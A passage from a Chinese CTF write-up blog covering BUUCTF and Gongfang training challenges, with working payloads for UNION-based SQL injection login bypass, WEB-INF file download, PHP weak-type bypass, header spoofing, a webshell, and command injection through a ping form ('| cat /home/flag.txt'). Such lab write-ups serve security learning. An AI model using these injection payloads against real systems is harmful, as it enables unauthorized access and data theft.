<p>再试试<code>select 1,2,3,4</code></p>
<p>又报错</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220909214506605.png"><img src="/wp-buuctf/image-20220909214506605.png" alt="image-20220909214506605"></a></p>
<p><strong>所以得出<code>列数一共有3列</code></strong></p>
<p><strong>根据经验这三列，分别是</strong><u><strong>id,username,password</strong></u></p>
<p>我们可以用以下语句进行确认</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">name=<span class="number">-1</span>&#x27;%<span class="number">20</span><span class="built_in">union</span>%<span class="number">20</span><span class="built_in">select</span>%<span class="number">20</span>”admin“,<span class="number">2</span>,<span class="number">3</span><span class="meta">#&amp;pw=123456   </span></span><br><span class="line"><span class="comment">//把第一位，即1的位置换成用户名admin</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220910085003536.png"><img src="/wp-buuctf/image-20220910085003536.png" alt="image-20220910085003536"></a></p>
<p>提示用户名错误，看来用户名不在第一位</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">name<span class="operator">=</span><span class="number">-1</span>&#x27;<span class="variable">%20</span>union<span class="variable">%20</span><span class="keyword">select</span><span class="variable">%201</span><span class="punctuation">,</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="number">3</span>#&amp;pw<span class="operator">=</span><span class="number">123456</span></span><br><span class="line">//把第二位，即<span class="number">2</span>的位置换成用户名admin</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220910085115686.png"><img src="/wp-buuctf/image-20220910085115686.png" alt="image-20220910085115686"></a></p>
<p>提示密码错误，看来用户名回显就在第二位</p>
<p><strong>但是没有回显我们select的数据，可是如果用报错注入和盲注的话，()被过滤了，也不能用</strong></p>
<p>所以我们只有考虑，怎么才可以登录上去</p>
<p>首先这是一个sql注入的题目，密码不可能简单的爆破就可以解决</p>
<p><strong>密码肯定是进行加密，最常见的密码加密就是md5</strong>，所以我们利用<code>md()</code>函数把我们的密码加密，再加上我们的用户名一起导入到题目的数据库里，即可完成登录</p>
<p>注意因为<code>()</code>被过滤，所以只能先把密码进行md5加密，在导入，而不能直接用函数</p>
<hr>
<p>这里又有一个新的知识点</p>
<p><strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。【union select】</strong></p>
<p>在<code>Web-study</code>里写的详细</p>
<p>下面简单说一下流程</p>
<p>先把我们的密码123456利用md5加密</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220910090640990.png"><img src="/wp-buuctf/image-20220910090640990.png" alt="image-20220910090640990"></a></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">e10adc3949ba59abbe56e057f20f883e</span><br></pre></td></tr></table></figure>

<p>然后构造payload</p>
<figure class="highlight q"><table><tr><td class="code"><pre><span class="line">name=<span class="number">-1</span>&#x27;%<span class="number">20</span><span class="built_in">union</span>%<span class="number">20</span><span class="keyword">select</span>%<span class="number">201</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>#&amp;pw=<span class="number">123456</span></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">联合注入的技巧，就是在使用<span class="built_in">union</span> <span class="keyword">select</span>时候，后面的数据如果不存在，就会生成一个虚拟的数据</span><br><span class="line">如上面的</span><br><span class="line"></span><br><span class="line">根据上面base编码结果，<span class="keyword">select</span> * <span class="keyword">from</span> user <span class="built_in">where</span> username = &#x27;$name&#x27;</span><br><span class="line"></span><br><span class="line">我们利用<span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span></span><br><span class="line"></span><br><span class="line">因为user表里不存在id=<span class="number">1</span>,username=admin,password=e10adc3949ba59abbe56e057f20f883e</span><br><span class="line"></span><br><span class="line">所以会生成一个一个数据插入表中</span><br><span class="line">*/</span><br><span class="line">/*</span><br><span class="line">当name参数进行sql注入，把数据插入user表中时</span><br><span class="line">后面password只要和明文一样，即可登录成功</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20220910091405613.png"><img src="/wp-buuctf/image-20220910091405613.png" alt="image-20220910091405613"></a></p>
<p>得到flag</p>
<h2 id="13-护网杯-2018-easy-tornado"><a href="#13-护网杯-2018-easy-tornado" class="headerlink" title="13.[护网杯 2018]easy_tornado"></a>13.[护网杯 2018]easy_tornado</h2><h3 id="1-题目描述-10"><a href="#1-题目描述-10" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-10"><a href="#2-wp-10" class="headerlink" title="2)wp"></a>2)wp</h3><h2 id="BUUCTF-RoarCTF-2019-Easy-Java"><a href="#BUUCTF-RoarCTF-2019-Easy-Java" class="headerlink" title="BUUCTF [RoarCTF 2019]Easy Java"></a>BUUCTF [RoarCTF 2019]Easy Java</h2><p><a href="https://www.cnblogs.com/darkcyan/p/17668377.html">https://www.cnblogs.com/darkcyan/p/17668377.html</a></p>
<p>题目是登陆页面，查看源码，发现一个连接<code>Download?filename=help.docx</code>，跳转到帮助文档。<br>点击help也可以跳转到帮助文档。<br>帮助文档内容为<code>java.io.FileNotFoundException:&#123;help.docx&#125;</code>，是java语句，帮助文档不存在。</p>
<h3 id="WEB-INF知识点"><a href="#WEB-INF知识点" class="headerlink" title="WEB-INF知识点#"></a>WEB-INF知识点<a href="https://www.cnblogs.com/darkcyan/p/17668377.html#web-inf%E7%9F%A5%E8%AF%86%E7%82%B9">#</a></h3><p>WEB-INF是java的WEB应用的安全目录，此外如果想在页面访问WEB-INF应用里面的文件，必</p>
<p>须要通过web.xml进行相应的映射才能访问。</p>
<p>其中敏感目录举例：</p>
<blockquote>
<p>&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则</p>
<p>&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在.jar文件中</p>
<p>&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</p>
<p>&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件</p>
<p>&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</p>
</blockquote>
<p>简单来说，java web是基于Tomcat服务器搭建的，通过servlet来开发。<br>狭义来说，servlet是指Java语言实现的一个接口。</p>
<p>访问方式</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>  这个就是指向我们要注册的servlet 的类地址, 要带包路径</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span>  是用来配置我们注册的组件的访问路径,里面包括两个节点</span><br><span class="line">一个是<span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>，这个要与前面写的servlet一致</span><br><span class="line">另一个是<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>，配置这个组件的访问路径</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span> 这个是我们要注册servlet的名字,一般跟Servlet类名有关</span><br><span class="line"></span><br><span class="line">举个例子</span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>servlet包含了路径信息，我们尝试包含一下FlagController所在路径，不过这次要在前面加上</p>
<p>classes来访问来访问class文件目录（详见上面的目录结构），且文件后缀为.class</p>
<p>如果GET无法访问web.xml，改用post</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20250113190039492.png"><img src="/wp-buuctf/image-20250113190039492.png" alt="image-20250113190039492"></a></p>
<p>com.wm.ctf.FlagController</p>
<p>就可以访问<code>WEB-INF/classes/com/wm/ctf/FlagController.class</code></p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20250113190224184.png"><img src="/wp-buuctf/image-20250113190224184.png" alt="image-20250113190224184"></a></p>
<p>ZmxhZ3s1NWFhNTFhOC02N2Y3LTQ0M2EtOTBhNC03NjExMWM3ZmZjMzR9Cg&#x3D;&#x3D;</p>
<p><a data-fancybox="gallery" data-src="/wp-buuctf/image-20250113190327271.png"><img src="/wp-buuctf/image-20250113190327271.png" alt="image-20250113190327271"></a></p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界靶场wp</title>
    <url>/wp-Gongfang/</url>
    <content><![CDATA[<p><code>这个线上靶场感觉很适合入门，而且难度分布也好，很优秀的线上靶场，非常值得仔细学习研究一下</code></p>
<p><code>...功防世界突然改版了，把题弄成一堆了，不过还是有难度系数，不过也方便看看有哪些适合难度的题目做一做</code></p>
<span id="more"></span>

<h1 id="Web新手"><a href="#Web新手" class="headerlink" title="Web新手"></a>Web新手</h1><h2 id="1-view-source"><a href="#1-view-source" class="headerlink" title="1.view_source"></a>1.view_source</h2><h3 id="1-题目描述"><a href="#1-题目描述" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了</p>
<h3 id="2-wp"><a href="#2-wp" class="headerlink" title="2)wp"></a>2)wp</h3><p>右键不管用，直接用F12查看</p>
<p>得到flag</p>
<h2 id="2-robots"><a href="#2-robots" class="headerlink" title="2.robots"></a>2.robots</h2><h3 id="1-题目描述-1"><a href="#1-题目描述-1" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师上课讲了<code>Robots</code>协议，小宁同学却上课打了瞌睡，赶紧来教教小宁<code>Robots</code>协议是什么吧</p>
<h3 id="2-wp-1"><a href="#2-wp-1" class="headerlink" title="2)wp"></a>2)wp</h3><p>不清楚<code>robots</code>协议是什么，于是我百度了一下，</p>
<p><code>robots协议也称爬虫协议、爬虫规则等,是指网站可建立一个robots.txt文件来告诉搜索引擎哪些页面可以抓取,哪些页面不能抓取,而搜索引擎则通过读取robots.txt文件来识别这个页面是否允许被抓取</code></p>
<p>也就是说网站下有一个robots.txt文件，规定了页面抓取规则，于是我们尝试访问<code>http://111.200.241.244:54251/robots.txt</code></p>
<p>界面显示如下</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220621223828917.png"><img src="/wp-Gongfang/image-20220621223828917.png" alt="image-20220621223828917"></a></p>
<p>disallow就是不允许抓取的页面，看到flag，就知道我们就要访问这个文件，于是访问<code>http://111.200.241.244:54251/f1ag_1s_h3re.php</code></p>
<p>得到flag</p>
<h2 id="3-backup"><a href="#3-backup" class="headerlink" title="3.backup"></a>3.backup</h2><h3 id="1-题目描述-2"><a href="#1-题目描述-2" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！</p>
<h3 id="2-wp-2"><a href="#2-wp-2" class="headerlink" title="2)wp"></a>2)wp</h3><p>看到找文件，首先我就想用dirsearch扫一扫</p>
<p>打开靶场先看到</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220621224315003.png"><img src="/wp-Gongfang/image-20220621224315003.png" alt="image-20220621224315003"></a></p>
<p>于是我先扫一扫，看一看有没有 index.php文件的文件名</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220621224424076.png"><img src="/wp-Gongfang/image-20220621224424076.png" alt="image-20220621224424076"></a></p>
<p>扫完后发现index.php.bak文件，很明显它就是备份文件，我们尝试直接访问它一下<code>http://111.200.241.244:52824/index.php.bak</code></p>
<p>自动下载好了index.php.bak，用文本打开</p>
<p>得到flag</p>
<h2 id="4-cookie"><a href="#4-cookie" class="headerlink" title="4.cookie"></a>4.cookie</h2><h3 id="1-题目描述-3"><a href="#1-题目描述-3" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：这是夹心饼干的意思吗？</p>
<h3 id="2）wp"><a href="#2）wp" class="headerlink" title="2）wp"></a>2）wp</h3><p>我的日常随记第一章大概讲了cookie的作用和含义，该题可以不了解也可以完成</p>
<p>目前我看cookie的有两个方法，一个是burpsuite抓包看，另一个就是用火狐插件Tamper Data，这里我用brup</p>
<p>我们先用burpsuite抓一个包看看</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220621225826671.png"><img src="/wp-Gongfang/image-20220621225826671.png" alt="image-20220621225826671"></a></p>
<p>发现cookie处提示有个cookie.php文件，访问<code>http://111.200.241.244:49599/cookie.php</code>看看，如下</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220621225920306.png"><img src="/wp-Gongfang/image-20220621225920306.png" alt="image-20220621225920306"></a></p>
<p>于是我们把抓包数据发到repeater里看看response</p>
<p>得到flag</p>
<h2 id="5-disabled-button"><a href="#5-disabled-button" class="headerlink" title="5.disabled_button"></a>5.disabled_button</h2><h3 id="1-题目描述-4"><a href="#1-题目描述-4" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？</p>
<h3 id="2-wp-3"><a href="#2-wp-3" class="headerlink" title="2)wp"></a>2)wp</h3><p>该题说按这个按钮不能按，那么为什么不能按，看看源码</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220621230709669.png"><img src="/wp-Gongfang/image-20220621230709669.png" alt="image-20220621230709669"></a></p>
<p>看到有个disabled，就是它使得按钮无法被按，所以删去就可以</p>
<p>打开开发者工具，在查看器里面，把disabled语句删去</p>
<p>按钮就可以按了，点击</p>
<p>得到flag</p>
<h2 id="6-weak-auth"><a href="#6-weak-auth" class="headerlink" title="6.weak_auth"></a>6.weak_auth</h2><h3 id="1-题目描述-5"><a href="#1-题目描述-5" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>小宁写了一个登陆验证页面，随手就设了一个密码。</p>
<h3 id="2-wp-4"><a href="#2-wp-4" class="headerlink" title="2)wp"></a>2)wp</h3><p>开始我们先随便输入用户名和密码，弹窗显示</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220623115614924.png"><img src="/wp-Gongfang/image-20220623115614924.png" alt="image-20220623115614924"></a></p>
<p>于是我们知道用户名是  admin，但是密码不知道，只知道是随手输入的，我们试试burp抓包看看有没有提示</p>
<p>在response里看到</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220623115811366.png"><img src="/wp-Gongfang/image-20220623115811366.png" alt="image-20220623115811366"></a></p>
<p>这里我们就知道要用burp的密码爆破，具体操作就不细讲，随记有写</p>
<p>这是部分密码txt的网站，可以下载使用，针对不同环境，用不同密码文本</p>
<p><a href="https://www.somd5.com/download/dict/">https://www.somd5.com/download/dict/</a></p>
<p>最后爆出密码123456,以用户 admin输入登录</p>
<p>得到flag</p>
<h2 id="7-simple-php"><a href="#7-simple-php" class="headerlink" title="7.simple_php"></a>7.simple_php</h2><h3 id="1-题目描述-6"><a href="#1-题目描述-6" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。</p>
<h3 id="2-wp-5"><a href="#2-wp-5" class="headerlink" title="2)wp"></a>2)wp</h3><p>先进行代码分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>); </span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]; </span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;   <span class="keyword">echo</span> <span class="variable">$flag1</span>; </span><br><span class="line">&#125; <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line"><span class="keyword">exit</span>(); &#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;   </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag2</span>; &#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>可以看到flag被分成了两个部分，一个flag1，一个 flag2</p>
<p>a,b两个变量以get型输入</p>
<p>第一个if要求a&#x3D;&#x3D;0且a为ture，这明显矛盾，当a&#x3D;0就代表a为false</p>
<p>所以这里涉及了php性质，php属于一门弱类型语言</p>
<p><code>弱类型：不必向 PHP 声明该变量的数据类型，PHP 会根据变量的值，自动把变量转换为正确的数据类型</code></p>
<p>所以当在第一个if判断a的值时，a可以利用弱类型性质，a&#x3D;0A，当进行a&#x3D;&#x3D;0判断时，会自动把a当作数字型，也就是把a&#x3D;0A后的A去掉，从而成立；</p>
<p>而当判断a是否为ture时，由于a&#x3D;0A而非0，所以结果为ture，输出flag1</p>
<p><em>这里思考一下，如果是 <code>if( $a===0 and $a )&#123; echo $flag1; &#125;</code>，那按上面对a赋值还可以吗？</em></p>
<p><em>这里涉及php类型比较&#x3D;&#x3D;与&#x3D;&#x3D;&#x3D;的区别</em></p>
<ul>
<li><em>松散比较：使用两个等号 <strong>&#x3D;&#x3D;</strong> 比较，只比较值，不比较类型。</em></li>
<li><em>严格比较：用三个等号 <strong>&#x3D;&#x3D;&#x3D;</strong> 比较，除了比较值，也比较类型。</em></li>
</ul>
<p><em>上面代码中&#x3D;&#x3D;对类型不比较，所以a&#x3D;0A与0比较时，可当作a&#x3D;0与0比较</em></p>
<p><em>但是当为&#x3D;&#x3D;&#x3D;时，a&#x3D;0A不属于数字型，所以当if(a&#x3D;&#x3D;&#x3D;0)返回false，从而返回false</em></p>
<p>第二个if看到，is_numeric($b)，这里要了解一下is_numereic()函数的作用</p>
<p><code>is_numeric()函数：用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回 1，即 TRUE</code></p>
<p>也就是说b的值不能为数字和数字串，但是第三个if要求b&gt;1234，所以b要为数字</p>
<p>这个和a一样，利用了php的弱类型性质，既然不能为数字，那b&#x3D;1235B，这样当b与1234比较时，b转化为数字型，去掉B，1235&gt;1234成立，输出flag2</p>
<p>于是payload为</p>
<p><code>http://111.200.241.244:51156/?a=0A&amp;b=1235B</code></p>
<p>得到flag</p>
<h2 id="8-get-post"><a href="#8-get-post" class="headerlink" title="8.get_post"></a>8.get_post</h2><h3 id="1-题目描述-7"><a href="#1-题目描述-7" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？</p>
<h3 id="2）wp-1"><a href="#2）wp-1" class="headerlink" title="2）wp"></a>2）wp</h3><p>Get和Post方式是HTTP通常使用两种请求方法</p>
<p>Get方式直接在url输入?a&#x3D;1</p>
<p><code>http://111.200.241.244:52081/?a=1</code></p>
<p>Post方式利用火狐插件HackerBar以post方式b&#x3D;2</p>
<p>run</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220624164728734.png"><img src="/wp-Gongfang/image-20220624164728734.png" alt="image-20220624164728734"></a></p>
<p>得到flag</p>
<h2 id="9-xff-referer"><a href="#9-xff-referer" class="headerlink" title="9.xff_referer"></a>9.xff_referer</h2><h3 id="1-题目描述-8"><a href="#1-题目描述-8" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>X老师告诉小宁其实xff和referer是可以伪造的</p>
<h3 id="2-wp-6"><a href="#2-wp-6" class="headerlink" title="2)wp"></a>2)wp</h3><p>先了解什么是xxf和referer</p>
<p><code>（1）X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP  代理或者负载均衡服务器时才会添加该项。xff是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。格式为：X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP</code></p>
<p><code>（2）HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。referer  是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用referer确认访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。</code></p>
<p>抓包后，发现并没有X-Forwarded-For和Referer，加上即可</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220624173529705.png"><img src="/wp-Gongfang/image-20220624173529705.png" alt="image-20220624173529705"></a></p>
<p>看题界面，提示ip必须为123.123.123.123，于是在抓包数据里加上</p>
<p><code>X-Forwarded-For： 123.123.123.123</code></p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220624174546646.png"><img src="/wp-Gongfang/image-20220624174546646.png" alt="image-20220624174546646"></a></p>
<p>send数据后，发现response里出现以下数据，也就是说还有声明是从谷歌界面过来的</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220624173805175.png"><img src="/wp-Gongfang/image-20220624173805175.png" alt="image-20220624173805175"></a></p>
<p>也就是还要加上</p>
<p><code>Referer:  https://www.google.com</code></p>
<p>最后如下</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220624174117936.png"><img src="/wp-Gongfang/image-20220624174117936.png" alt="image-20220624174117936"></a></p>
<p>send到response后</p>
<p>得到 flag</p>
<h2 id="10-webshell"><a href="#10-webshell" class="headerlink" title="10.webshell"></a>10.webshell</h2><h3 id="1-题目描述-9"><a href="#1-题目描述-9" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>小宁百度了php一句话,觉着很有意思,并且把它放在index.php里</p>
<h3 id="2-wp-7"><a href="#2-wp-7" class="headerlink" title="2)wp"></a>2)wp</h3><p>看到这句代码我一下想到一句话木马，标题<a href="../../../../2022/06/21/Qusetion/">webshell</a>也提示这个木马题，根据描述我们知道这个木马在index.php里</p>
<p>不了解的可以看看这篇文章</p>
<p><a href="https://www.jianshu.com/p/6b815f951db3">php一句话木马</a></p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220624210259387.png"><img src="/wp-Gongfang/image-20220624210259387.png" alt="image-20220624210259387"></a></p>
<p>用蚁剑连接即可，这里对蚁剑使用方法不赘述，建议自己操作学习</p>
<p>得到flag</p>
<h2 id="11-command-execution"><a href="#11-command-execution" class="headerlink" title="11.command_execution"></a>11.command_execution</h2><h3 id="1-题目描述-10"><a href="#1-题目描述-10" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。</p>
<h3 id="2-wp-8"><a href="#2-wp-8" class="headerlink" title="2)wp"></a>2)wp</h3><p>根据题目名知道这是命令执行漏洞的题，可以先了解一下<a href="../../../../2022/05/28/Web-study">命令执行</a>的知识</p>
<p>先用自己的IP试一下</p>
<p><code>120.0.0.1</code></p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220624213448262.png"><img src="/wp-Gongfang/image-20220624213448262.png" alt="image-20220624213448262"></a></p>
<p>得到以下数据，由此可知我们上传的命令是<code>ping -c 3 + 输入的语句</code>，所以需要用到管道符</p>
<p>此处不止可以用 |，了解了其他管道符的作用，也可以达到相同的效果</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220624215127339.png"><img src="/wp-Gongfang/image-20220624215127339.png" alt="image-20220624215127339"></a></p>
<p>在利用管道符，在当前目录及其子目录查找有没有名为flag.txt的文件</p>
<p><code>120.0.0.1 | find  / -name flag.txt</code></p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220624215415187.png"><img src="/wp-Gongfang/image-20220624215415187.png" alt="image-20220624215415187"></a></p>
<p>得到flag.txt的位置的绝对路径</p>
<p>输出打印flag,txt</p>
<p><code>120.0.0.1 | cat /home/flag.txt</code></p>
<p>得到flag</p>
<h2 id="12-simple-js"><a href="#12-simple-js" class="headerlink" title="12.simple_js"></a>12.simple_js</h2><h3 id="1）题目描述"><a href="#1）题目描述" class="headerlink" title="1）题目描述"></a>1）题目描述</h3><p>小宁发现了一个网页，但却一直输不对密码。</p>
<p>(Flag格式为 Cyberpeace{xxxxxxxxx} )</p>
<h3 id="2）wp-2"><a href="#2）wp-2" class="headerlink" title="2）wp"></a>2）wp</h3><p>该题涉及代码审计，看起有点难度，但说实话大部分内容与代码审计无关，但可以分析一下</p>
<p>开始界面弹窗输入密码</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220624221241740.png"><img src="/wp-Gongfang/image-20220624221241740.png" alt="image-20220624221241740"></a></p>
<p>输入错误，提示FAUX PASSWORD HAHA</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220624221310762.png"><img src="/wp-Gongfang/image-20220624221310762.png" alt="image-20220624221310762"></a></p>
<p>我们F12把它源码拿出来分析一下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">dechiffre</span>(<span class="params">pass_enc</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> pass = <span class="string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> tab  = pass_enc.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> tab2 = pass.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        i = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">        j = tab.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">        k = j + (l) + (n=<span class="number">0</span>);</span></span><br><span class="line"><span class="language-javascript">        n = tab2.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )</span></span><br><span class="line"><span class="language-javascript">    &#123;o = tab[i-l];p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span>(i == <span class="number">5</span>)<span class="keyword">break</span>;&#125;</span></span><br><span class="line"><span class="language-javascript">               <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )</span></span><br><span class="line"><span class="language-javascript">               &#123;</span></span><br><span class="line"><span class="language-javascript">                   o = tab[i-l];</span></span><br><span class="line"><span class="language-javascript">                   <span class="keyword">if</span>(i &gt; <span class="number">5</span> &amp;&amp; i &lt; k-<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript">                   p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span><br><span class="line"><span class="language-javascript">               &#125;</span></span><br><span class="line"><span class="language-javascript">        p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(tab2[<span class="number">17</span>]);</span></span><br><span class="line"><span class="language-javascript">        pass = p;<span class="keyword">return</span> pass;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    h = <span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&#x27;Enter password&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>( <span class="title function_">dechiffre</span>(h) );</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span 